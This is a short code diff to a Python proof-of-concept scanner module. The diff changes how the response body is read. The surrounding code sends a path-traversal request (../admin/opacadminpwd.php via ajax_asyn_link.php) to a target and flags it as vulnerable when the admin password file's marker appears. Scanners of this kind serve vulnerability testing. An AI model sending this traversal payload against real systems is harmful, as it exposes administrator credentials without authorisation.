@@ -48,7 +48,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/zplug/ajax_asyn_link.php?url=../admin/opacadminpwd.php'
             response = requests.get(vul_url)
-            if response.status_code == 200 and 'strPassWdFile' in response.content:
+            if response.status_code == 200 and 'strPassWdFile' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
